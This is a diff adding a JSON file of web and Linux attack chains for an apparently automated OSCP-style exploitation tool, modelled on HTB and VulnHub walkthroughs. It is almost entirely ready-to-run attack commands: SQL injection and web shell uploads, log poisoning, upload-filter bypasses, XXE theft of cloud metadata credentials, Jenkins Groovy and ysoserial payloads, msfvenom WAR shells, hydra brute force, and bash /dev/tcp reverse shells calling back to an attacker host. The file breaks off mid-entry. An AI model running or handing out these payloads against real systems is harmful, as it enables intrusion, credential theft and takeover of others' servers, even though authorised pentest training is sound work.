@@ -1,0 +1,903 @@
+{
+  "metadata": {
+    "version": "1.0",
+    "description": "Real-world attack chains from HTB/VulnHub walkthroughs for OSCP-style exploitation",
+    "last_updated": "2025-10-11",
+    "sources": [
+      "HTB Academy SQL Injection Fundamentals (2024)",
+      "HTB Builder & Jeeves (Jenkins exploitation)",
+      "HTB Jerry (Tomcat exploitation)",
+      "VulnHub Symfonos series (LFI to RCE)",
+      "HTB Bookworm (XSS + IDOR chain)",
+      "PortSwigger Web Security Academy",
+      "HackTricks pentesting wiki",
+      "OSCP preparation resources (TJ NULL list)"
+    ]
+  },
+  "attack_chains": [
+    {
+      "id": "sqli-to-shell",
+      "name": "SQL Injection to Web Shell",
+      "description": "Exploit SQLi to upload web shell via INTO OUTFILE, then escalate to reverse shell",
+      "trigger_finding_types": ["sql_injection", "sqli", "database"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.90,
+      "source": "HTB Academy SQL Injection Fundamentals (2024)",
+      "estimated_total_time_minutes": 35,
+      "steps": [
+        {
+          "id": "sqli-confirm",
+          "name": "Confirm SQL Injection",
+          "description": "Test parameter for SQLi vulnerability using sqlmap",
+          "command_template": "sqlmap -u 'http://<TARGET>:<PORT>/page.php?id=1' --batch --level=2 --risk=2",
+          "success_indicators": ["injectable", "parameter: id", "MySQL", "Type: boolean-based"],
+          "failure_indicators": ["not injectable", "connection refused", "WAF detected"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "sqli-enum-db",
+          "name": "Enumerate Database",
+          "description": "Extract database structure and table names",
+          "command_template": "sqlmap -u 'http://<TARGET>:<PORT>/page.php?id=1' --batch --dbs --tables",
+          "success_indicators": ["database:", "table:", "available databases"],
+          "failure_indicators": ["error", "timeout", "access denied"],
+          "estimated_time_minutes": 8,
+          "manual": false
+        },
+        {
+          "id": "sqli-dump-creds",
+          "name": "Dump Credentials",
+          "description": "Extract user credentials from database tables",
+          "command_template": "sqlmap -u 'http://<TARGET>:<PORT>/page.php?id=1' --batch -D webapp -T users --dump",
+          "success_indicators": ["username", "password", "hash", "entries"],
+          "failure_indicators": ["empty set", "access denied", "no entries"],
+          "estimated_time_minutes": 10,
+          "manual": false
+        },
+        {
+          "id": "sqli-shell-upload",
+          "name": "Upload Web Shell via INTO OUTFILE",
+          "description": "Use UNION injection to write PHP shell to web directory",
+          "command_template": "sqlmap -u 'http://<TARGET>:<PORT>/page.php?id=1' --batch --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php",
+          "success_indicators": ["file written", "success", "uploaded"],
+          "failure_indicators": ["permission denied", "failed", "read-only"],
+          "estimated_time_minutes": 7,
+          "manual": true,
+          "manual_alternative": "curl 'http://<TARGET>:<PORT>/page.php?id=1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -"
+        },
+        {
+          "id": "sqli-reverse-shell",
+          "name": "Execute Reverse Shell",
+          "description": "Trigger uploaded shell to establish reverse connection",
+          "command_template": "curl 'http://<TARGET>:<PORT>/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<LHOST>/<LPORT>%200%3E%261%22'",
+          "success_indicators": ["connection received", "shell spawned"],
+          "failure_indicators": ["connection refused", "404", "command not found"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "lfi-to-rce-log-poison",
+      "name": "LFI to RCE via Log Poisoning",
+      "description": "Exploit Local File Inclusion to poison Apache logs and achieve code execution",
+      "trigger_finding_types": ["lfi", "local_file_inclusion", "path_traversal", "file_inclusion"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.80,
+      "source": "VulnHub Symfonos series + OSCP methodology",
+      "estimated_total_time_minutes": 20,
+      "steps": [
+        {
+          "id": "lfi-confirm",
+          "name": "Confirm LFI Vulnerability",
+          "description": "Test parameter for local file inclusion by reading /etc/passwd",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page.php?file=../../../../etc/passwd'",
+          "success_indicators": ["root:x:0:0", "passwd", "bin/bash"],
+          "failure_indicators": ["not found", "forbidden", "blocked"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "lfi-find-logs",
+          "name": "Identify Poisonable Log File",
+          "description": "Find accessible log files (Apache access.log, error.log, auth.log)",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page.php?file=../../../../var/log/apache2/access.log'",
+          "success_indicators": ["GET", "HTTP/1.1", "User-Agent", "Mozilla"],
+          "failure_indicators": ["not found", "permission denied", "empty"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "lfi-poison-log",
+          "name": "Poison Log with PHP Code",
+          "description": "Inject PHP code via User-Agent header to log file",
+          "command_template": "curl -A '<?php system($_GET[\"cmd\"]); ?>' 'http://<TARGET>:<PORT>/'",
+          "success_indicators": ["200 OK"],
+          "failure_indicators": ["error", "blocked", "403"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "lfi-execute-rce",
+          "name": "Execute Commands via Poisoned Log",
+          "description": "Trigger RCE by including poisoned log with cmd parameter",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami'",
+          "success_indicators": ["www-data", "apache", "nginx"],
+          "failure_indicators": ["error", "not found", "syntax error"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "lfi-reverse-shell",
+          "name": "Establish Reverse Shell",
+          "description": "Execute reverse shell command via RCE",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page.php?file=../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<LHOST>/<LPORT>%200%3E%261%22'",
+          "success_indicators": ["connection received"],
+          "failure_indicators": ["connection refused", "timeout"],
+          "estimated_time_minutes": 7,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "file-upload-bypass",
+      "name": "File Upload Bypass to Web Shell",
+      "description": "Bypass file upload filters using various techniques to achieve code execution",
+      "trigger_finding_types": ["file_upload", "upload", "image_upload"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.85,
+      "source": "HTB Academy File Upload Attacks + PortSwigger",
+      "estimated_total_time_minutes": 25,
+      "steps": [
+        {
+          "id": "upload-test-basic",
+          "name": "Test Basic File Upload",
+          "description": "Attempt to upload PHP shell with .php extension",
+          "command_template": "curl -X POST -F 'file=@shell.php' http://<TARGET>:<PORT>/upload.php",
+          "success_indicators": ["uploaded", "success", "200 OK"],
+          "failure_indicators": ["invalid file type", "not allowed", "extension blocked"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "upload-extension-bypass",
+          "name": "Bypass Extension Filters",
+          "description": "Try alternative extensions: .php5, .phtml, .phar, .jpg.php",
+          "command_template": "curl -X POST -F 'file=@shell.phtml' http://<TARGET>:<PORT>/upload.php",
+          "success_indicators": ["uploaded", "success"],
+          "failure_indicators": ["invalid", "blocked"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "upload-mime-bypass",
+          "name": "Bypass MIME Type Filters",
+          "description": "Modify Content-Type header to bypass MIME validation",
+          "command_template": "curl -X POST -H 'Content-Type: image/jpeg' -F 'file=@shell.php' http://<TARGET>:<PORT>/upload.php",
+          "success_indicators": ["uploaded", "success"],
+          "failure_indicators": ["invalid", "MIME type"],
+          "estimated_time_minutes": 4,
+          "manual": false
+        },
+        {
+          "id": "upload-magic-bytes",
+          "name": "Prepend Magic Bytes",
+          "description": "Add JPEG magic bytes (FF D8 FF E0) to bypass file signature validation",
+          "command_template": "echo -e '\\xFF\\xD8\\xFF\\xE0\\x00\\x10\\x4A\\x46\\x49\\x46\\x00\\x01\\n<?php system($_GET[\"cmd\"]); ?>' > shell.php.jpg && curl -X POST -F 'file=@shell.php.jpg' http://<TARGET>:<PORT>/upload.php",
+          "success_indicators": ["uploaded", "success"],
+          "failure_indicators": ["invalid", "corrupted"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "upload-path-traversal",
+          "name": "Use Path Traversal in Filename",
+          "description": "Upload to web root using ../ in filename",
+          "command_template": "curl -X POST -F 'file=@../../../../../../var/www/html/shell.php' http://<TARGET>:<PORT>/upload.php",
+          "success_indicators": ["uploaded", "success"],
+          "failure_indicators": ["invalid path", "blocked"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "upload-execute-shell",
+          "name": "Execute Uploaded Shell",
+          "description": "Access uploaded shell and execute commands",
+          "command_template": "curl 'http://<TARGET>:<PORT>/uploads/shell.php?cmd=id'",
+          "success_indicators": ["uid=", "www-data", "apache"],
+          "failure_indicators": ["404", "not found"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "xxe-to-ssrf-to-rce",
+      "name": "XXE to SSRF to RCE",
+      "description": "Chain XML External Entity to Server-Side Request Forgery to Remote Code Execution",
+      "trigger_finding_types": ["xxe", "xml_injection", "xml_parser"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.70,
+      "source": "PortSwigger Web Security Academy + OSCP Notes",
+      "estimated_total_time_minutes": 30,
+      "steps": [
+        {
+          "id": "xxe-confirm",
+          "name": "Confirm XXE Vulnerability",
+          "description": "Test XML parser with external entity referencing /etc/passwd",
+          "command_template": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>' http://<TARGET>:<PORT>/api/parse",
+          "success_indicators": ["root:x:0:0", "passwd"],
+          "failure_indicators": ["parse error", "entity not allowed"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "xxe-file-read",
+          "name": "Read Configuration Files",
+          "description": "Extract sensitive config files via XXE",
+          "command_template": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">]><root><data>&xxe;</data></root>' http://<TARGET>:<PORT>/api/parse",
+          "success_indicators": ["db_password", "API_KEY", "credentials"],
+          "failure_indicators": ["not found", "permission denied"],
+          "estimated_time_minutes": 8,
+          "manual": false
+        },
+        {
+          "id": "xxe-ssrf-internal",
+          "name": "Use XXE for SSRF to Internal Services",
+          "description": "Access internal services via SSRF through XXE",
+          "command_template": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:8080/admin\">]><root><data>&xxe;</data></root>' http://<TARGET>:<PORT>/api/parse",
+          "success_indicators": ["admin panel", "internal", "authenticated"],
+          "failure_indicators": ["connection refused", "timeout"],
+          "estimated_time_minutes": 7,
+          "manual": false
+        },
+        {
+          "id": "xxe-ssrf-cloud-metadata",
+          "name": "Access Cloud Metadata via SSRF",
+          "description": "Extract AWS/Azure credentials from metadata endpoint",
+          "command_template": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><root><data>&xxe;</data></root>' http://<TARGET>:<PORT>/api/parse",
+          "success_indicators": ["AccessKeyId", "SecretAccessKey", "Token"],
+          "failure_indicators": ["not found", "404"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "xxe-expect-rce",
+          "name": "Execute Commands via expect:// Wrapper",
+          "description": "Use PHP expect wrapper for command execution",
+          "command_template": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><root><data>&xxe;</data></root>' http://<TARGET>:<PORT>/api/parse",
+          "success_indicators": ["uid=", "gid="],
+          "failure_indicators": ["expect disabled", "not supported"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "jenkins-groovy-rce",
+      "name": "Jenkins Groovy Script Console RCE",
+      "description": "Exploit Jenkins Script Console with Groovy reverse shell",
+      "trigger_finding_types": ["jenkins", "automation_server"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.75,
+      "source": "HTB Jeeves walkthrough",
+      "estimated_total_time_minutes": 15,
+      "steps": [
+        {
+          "id": "jenkins-discover",
+          "name": "Discover Jenkins Installation",
+          "description": "Identify Jenkins service and version",
+          "command_template": "curl -I http://<TARGET>:<PORT>/",
+          "success_indicators": ["X-Jenkins:", "Jenkins", "X-Hudson"],
+          "failure_indicators": ["404", "connection refused"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "jenkins-default-creds",
+          "name": "Test Default Credentials",
+          "description": "Try common Jenkins credentials (admin:admin, jenkins:jenkins)",
+          "command_template": "curl -u admin:admin http://<TARGET>:<PORT>/me/configure",
+          "success_indicators": ["200 OK", "User Configuration", "authenticated"],
+          "failure_indicators": ["401", "Unauthorized", "Invalid credentials"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "jenkins-script-console",
+          "name": "Access Script Console",
+          "description": "Navigate to /script endpoint for Groovy console",
+          "command_template": "curl -u admin:admin http://<TARGET>:<PORT>/script",
+          "success_indicators": ["Script Console", "Groovy script"],
+          "failure_indicators": ["403", "Forbidden"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "jenkins-reverse-shell",
+          "name": "Execute Groovy Reverse Shell",
+          "description": "Use Groovy script to establish reverse shell",
+          "command_template": "curl -u admin:admin -X POST http://<TARGET>:<PORT>/script -d 'script=String host=\"<LHOST>\";int port=<LPORT>;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'",
+          "success_indicators": ["connection received", "shell"],
+          "failure_indicators": ["error", "exception"],
+          "estimated_time_minutes": 8,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "tomcat-manager-deploy",
+      "name": "Tomcat Manager WAR Deployment RCE",
+      "description": "Deploy malicious WAR file via Tomcat Manager to achieve RCE",
+      "trigger_finding_types": ["tomcat", "apache_tomcat", "java_application_server"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.85,
+      "source": "HTB Jerry walkthrough",
+      "estimated_total_time_minutes": 20,
+      "steps": [
+        {
+          "id": "tomcat-discover",
+          "name": "Discover Tomcat Installation",
+          "description": "Identify Tomcat service and version",
+          "command_template": "curl -I http://<TARGET>:<PORT>/",
+          "success_indicators": ["Apache-Coyote", "Tomcat", "Server:"],
+          "failure_indicators": ["404", "connection refused"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "tomcat-manager-access",
+          "name": "Access Tomcat Manager",
+          "description": "Brute force or test default credentials for /manager/html",
+          "command_template": "hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/tomcat-betterdefaultpasslist.txt <TARGET> http-get /manager/html -s <PORT>",
+          "success_indicators": ["valid password found", "200 OK"],
+          "failure_indicators": ["no valid password", "403"],
+          "estimated_time_minutes": 8,
+          "manual": false
+        },
+        {
+          "id": "tomcat-create-war",
+          "name": "Create Malicious WAR File",
+          "description": "Generate JSP reverse shell packaged as WAR",
+          "command_template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war",
+          "success_indicators": ["Payload size:", "Saved as"],
+          "failure_indicators": ["error", "failed"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "tomcat-deploy-war",
+          "name": "Deploy WAR via Manager",
+          "description": "Upload and deploy malicious WAR file",
+          "command_template": "curl -u tomcat:s3cret --upload-file shell.war 'http://<TARGET>:<PORT>/manager/text/deploy?path=/shell'",
+          "success_indicators": ["OK - Deployed", "deployed"],
+          "failure_indicators": ["FAIL", "error"],
+          "estimated_time_minutes": 4,
+          "manual": false
+        },
+        {
+          "id": "tomcat-trigger-shell",
+          "name": "Trigger Reverse Shell",
+          "description": "Access deployed application to execute shell",
+          "command_template": "curl http://<TARGET>:<PORT>/shell/",
+          "success_indicators": ["connection received"],
+          "failure_indicators": ["404", "connection refused"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "java-deserialization-rce",
+      "name": "Java Deserialization to RCE",
+      "description": "Exploit insecure Java deserialization using ysoserial",
+      "trigger_finding_types": ["java", "deserialization", "serialization"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.65,
+      "source": "HTB LogForge + Java deserialization research",
+      "estimated_total_time_minutes": 25,
+      "steps": [
+        {
+          "id": "deser-detect",
+          "name": "Detect Deserialization Point",
+          "description": "Identify Java serialized objects (rO0 base64 signature)",
+          "command_template": "echo 'Cookie value' | base64 -d | xxd | head",
+          "success_indicators": ["aced", "0005", "serialized"],
+          "failure_indicators": ["invalid", "not base64"],
+          "estimated_time_minutes": 5,
+          "manual": true,
+          "manual_alternative": "Inspect HTTP requests in Burp Suite for base64-encoded cookies/parameters starting with 'rO0'"
+        },
+        {
+          "id": "deser-urldns-test",
+          "name": "Test with URLDNS Payload",
+          "description": "Verify deserialization with non-RCE URLDNS payload",
+          "command_template": "java -jar ysoserial.jar URLDNS 'http://your-burp-collaborator.com' | base64 -w0",
+          "success_indicators": ["DNS query received", "callback"],
+          "failure_indicators": ["no callback", "timeout"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "deser-identify-gadget",
+          "name": "Identify Gadget Chain",
+          "description": "Determine which Java library is present (CommonsCollections, Spring, etc.)",
+          "command_template": "java -jar ysoserial.jar CommonsCollections6 'ping -c 1 <LHOST>' | base64 -w0",
+          "success_indicators": ["ping received", "ICMP"],
+          "failure_indicators": ["no ping", "timeout"],
+          "estimated_time_minutes": 8,
+          "manual": false
+        },
+        {
+          "id": "deser-reverse-shell",
+          "name": "Execute Reverse Shell",
+          "description": "Use working gadget chain to establish reverse shell",
+          "command_template": "java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88TEhPU1Q+LzxMUE9SVD4gMD4mMQ==}|{base64,-d}|{bash,-i}' | base64 -w0",
+          "success_indicators": ["connection received", "shell"],
+          "failure_indicators": ["connection refused", "error"],
+          "estimated_time_minutes": 7,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "command-injection-shell",
+      "name": "Command Injection to Reverse Shell",
+      "description": "Exploit OS command injection vulnerability to establish reverse shell",
+      "trigger_finding_types": ["command_injection", "os_command_injection", "rce"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.90,
+      "source": "HTB Academy Command Injections + multiple HTB boxes",
+      "estimated_total_time_minutes": 15,
+      "steps": [
+        {
+          "id": "cmdinj-detect",
+          "name": "Detect Command Injection",
+          "description": "Test parameter with command separators (;, &&, ||, |)",
+          "command_template": "curl 'http://<TARGET>:<PORT>/ping.php?ip=127.0.0.1;whoami'",
+          "success_indicators": ["www-data", "apache", "nginx", "root"],
+          "failure_indicators": ["invalid", "error"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "cmdinj-bypass-filter",
+          "name": "Bypass Input Filters",
+          "description": "Use encoding, variable expansion, wildcards to bypass filters",
+          "command_template": "curl 'http://<TARGET>:<PORT>/ping.php?ip=127.0.0.1%26%26wh${IFS}oami'",
+          "success_indicators": ["www-data", "apache"],
+          "failure_indicators": ["blocked", "invalid"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "cmdinj-reverse-shell",
+          "name": "Execute Reverse Shell",
+          "description": "Inject reverse shell one-liner using bash/nc/python",
+          "command_template": "curl 'http://<TARGET>:<PORT>/ping.php?ip=127.0.0.1;bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<LHOST>/<LPORT>%200%3E%261%22'",
+          "success_indicators": ["connection received", "shell spawned"],
+          "failure_indicators": ["connection refused", "command not found"],
+          "estimated_time_minutes": 7,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "ssti-jinja2-rce",
+      "name": "SSTI (Jinja2) to RCE",
+      "description": "Server-Side Template Injection in Jinja2 to achieve remote code execution",
+      "trigger_finding_types": ["ssti", "template_injection", "python", "flask"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.70,
+      "source": "PortSwigger + HackTricks SSTI techniques",
+      "estimated_total_time_minutes": 20,
+      "steps": [
+        {
+          "id": "ssti-detect",
+          "name": "Detect SSTI Vulnerability",
+          "description": "Test with polyglot payload {{7*7}}, ${7*7}, <%= 7*7 %>",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page?name={{7*7}}'",
+          "success_indicators": ["49", "calculated"],
+          "failure_indicators": ["{{7*7}}", "error"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "ssti-identify-engine",
+          "name": "Identify Template Engine",
+          "description": "Determine template engine (Jinja2, Twig, Mako, etc.)",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page?name={{config}}'",
+          "success_indicators": ["Config", "SECRET_KEY", "DEBUG"],
+          "failure_indicators": ["error", "undefined"],
+          "estimated_time_minutes": 4,
+          "manual": false
+        },
+        {
+          "id": "ssti-enumerate-classes",
+          "name": "Enumerate Python Classes",
+          "description": "Access __mro__ to find base classes for RCE",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page?name={{%27%27.__class__.__mro__[1].__subclasses__()}}'",
+          "success_indicators": ["subprocess.Popen", "os._wrap_close"],
+          "failure_indicators": ["error", "restricted"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "ssti-command-execution",
+          "name": "Execute OS Commands",
+          "description": "Use subprocess.Popen or os.system for command execution",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page?name={{%27%27.__class__.__mro__[1].__subclasses__()[396](%27whoami%27,shell=True,stdout=-1).communicate()[0].strip()}}'",
+          "success_indicators": ["www-data", "apache"],
+          "failure_indicators": ["error", "exception"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "ssti-reverse-shell",
+          "name": "Establish Reverse Shell",
+          "description": "Execute reverse shell command via SSTI",
+          "command_template": "curl 'http://<TARGET>:<PORT>/page?name={{%27%27.__class__.__mro__[1].__subclasses__()[396](%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<LHOST>/<LPORT>%200%3E%261%22%27,shell=True,stdout=-1).communicate()}}'",
+          "success_indicators": ["connection received"],
+          "failure_indicators": ["connection refused", "error"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "path-traversal-auth-bypass",
+      "name": "Path Traversal to Config Leak to Auth Bypass",
+      "description": "Chain path traversal to leak credentials, then bypass authentication",
+      "trigger_finding_types": ["path_traversal", "directory_traversal", "lfi"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.80,
+      "source": "OSCP methodology + PortSwigger labs",
+      "estimated_total_time_minutes": 18,
+      "steps": [
+        {
+          "id": "traversal-detect",
+          "name": "Detect Path Traversal",
+          "description": "Test with ../ sequences to read /etc/passwd",
+          "command_template": "curl 'http://<TARGET>:<PORT>/download?file=../../../../etc/passwd'",
+          "success_indicators": ["root:x:0:0", "passwd"],
+          "failure_indicators": ["not found", "blocked"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "traversal-bypass-filter",
+          "name": "Bypass Path Filters",
+          "description": "Use encoding, absolute paths, null bytes to bypass filters",
+          "command_template": "curl 'http://<TARGET>:<PORT>/download?file=....//....//....//....//etc/passwd'",
+          "success_indicators": ["root:x:0:0"],
+          "failure_indicators": ["blocked", "invalid"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "traversal-config-leak",
+          "name": "Leak Configuration Files",
+          "description": "Extract database credentials, API keys from config files",
+          "command_template": "curl 'http://<TARGET>:<PORT>/download?file=../../../../var/www/html/config.php'",
+          "success_indicators": ["db_password", "DB_USER", "mysql_connect"],
+          "failure_indicators": ["not found", "permission denied"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "traversal-auth-bypass",
+          "name": "Bypass Authentication with Leaked Creds",
+          "description": "Use leaked credentials to authenticate to admin panel",
+          "command_template": "curl -X POST -d 'username=admin&password=leaked_password' http://<TARGET>:<PORT>/login",
+          "success_indicators": ["authenticated", "welcome", "dashboard"],
+          "failure_indicators": ["invalid credentials", "login failed"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "credential-reuse-chain",
+      "name": "Credential Reuse Attack Chain",
+      "description": "Chain credential reuse across SSH, database, and web admin interfaces",
+      "trigger_finding_types": ["credential", "password", "hash"],
+      "required_phase": "EXPLOITATION",
+      "oscp_relevance": 0.95,
+      "source": "OSCP methodology + real exam scenarios",
+      "estimated_total_time_minutes": 20,
+      "steps": [
+        {
+          "id": "cred-discover-db",
+          "name": "Discover Database Credentials",
+          "description": "Extract database credentials from web config or /var/www/html",
+          "command_template": "grep -r 'password' /var/www/html/*.php 2>/dev/null",
+          "success_indicators": ["db_password", "mysql", "mysqli_connect"],
+          "failure_indicators": ["no such file", "permission denied"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "cred-enumerate-users",
+          "name": "Enumerate System Users",
+          "description": "Extract valid usernames from /etc/passwd with login shells",
+          "command_template": "cat /etc/passwd | grep -v nologin | grep -v '/bin/false' | cut -d: -f1",
+          "success_indicators": ["root", "user", "admin"],
+          "failure_indicators": ["permission denied"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "cred-test-ssh",
+          "name": "Test Credentials on SSH",
+          "description": "Attempt SSH login with discovered credentials",
+          "command_template": "sshpass -p 'discovered_password' ssh user@<TARGET>",
+          "success_indicators": ["$", "#", "Welcome", "Last login"],
+          "failure_indicators": ["Permission denied", "Connection refused"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "cred-access-db",
+          "name": "Access Database",
+          "description": "Connect to MySQL/PostgreSQL with discovered credentials",
+          "command_template": "mysql -u dbuser -p'db_password' -h <TARGET> -e 'SHOW DATABASES;'",
+          "success_indicators": ["Database", "information_schema"],
+          "failure_indicators": ["Access denied", "ERROR"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "cred-escalate-web",
+          "name": "Escalate to Web Admin",
+          "description": "Use database access to extract/reset admin password",
+          "command_template": "mysql -u dbuser -p'db_password' -h <TARGET> webapp -e 'SELECT username,password FROM users WHERE role=\"admin\";'",
+          "success_indicators": ["admin", "hash", "password"],
+          "failure_indicators": ["ERROR", "access denied"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "sudo-privesc",
+      "name": "Privilege Escalation via Sudo Misconfiguration",
+      "description": "Escalate privileges by exploiting sudo permissions",
+      "trigger_finding_types": ["sudo", "privilege_escalation"],
+      "required_phase": "POST_EXPLOITATION",
+      "oscp_relevance": 0.95,
+      "source": "OSCP Linux PrivEsc methodology + GTFOBins",
+      "estimated_total_time_minutes": 12,
+      "steps": [
+        {
+          "id": "sudo-check",
+          "name": "Check Sudo Permissions",
+          "description": "List commands user can run with sudo",
+          "command_template": "sudo -l",
+          "success_indicators": ["(root)", "NOPASSWD", "may run"],
+          "failure_indicators": ["may not run sudo", "password"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "sudo-gtfobins",
+          "name": "Check GTFOBins for Exploit",
+          "description": "Lookup sudo-allowed binary on GTFOBins for shell escape",
+          "command_template": "echo 'Manual: Visit https://gtfobins.github.io/gtfobins/<binary>/#sudo'",
+          "success_indicators": ["shell", "SUID", "sudo"],
+          "failure_indicators": ["not found"],
+          "estimated_time_minutes": 3,
+          "manual": true,
+          "manual_alternative": "Search GTFOBins website for the binary name"
+        },
+        {
+          "id": "sudo-exploit-shell",
+          "name": "Exploit for Root Shell",
+          "description": "Execute GTFOBins technique to spawn root shell",
+          "command_template": "sudo /usr/bin/vim -c ':!/bin/bash'",
+          "success_indicators": ["root@", "#", "uid=0"],
+          "failure_indicators": ["permission denied", "error"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "sudo-verify-root",
+          "name": "Verify Root Access",
+          "description": "Confirm root privileges obtained",
+          "command_template": "whoami && id",
+          "success_indicators": ["root", "uid=0(root)"],
+          "failure_indicators": ["www-data", "user"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "suid-binary-privesc",
+      "name": "Privilege Escalation via SUID Binary",
+      "description": "Exploit misconfigured SUID binary to gain root access",
+      "trigger_finding_types": ["suid", "privilege_escalation"],
+      "required_phase": "POST_EXPLOITATION",
+      "oscp_relevance": 0.90,
+      "source": "OSCP Linux PrivEsc + GTFOBins",
+      "estimated_total_time_minutes": 15,
+      "steps": [
+        {
+          "id": "suid-find",
+          "name": "Find SUID Binaries",
+          "description": "Locate all SUID binaries on system",
+          "command_template": "find / -perm -u=s -type f 2>/dev/null",
+          "success_indicators": ["/usr/bin/", "/bin/", "suid"],
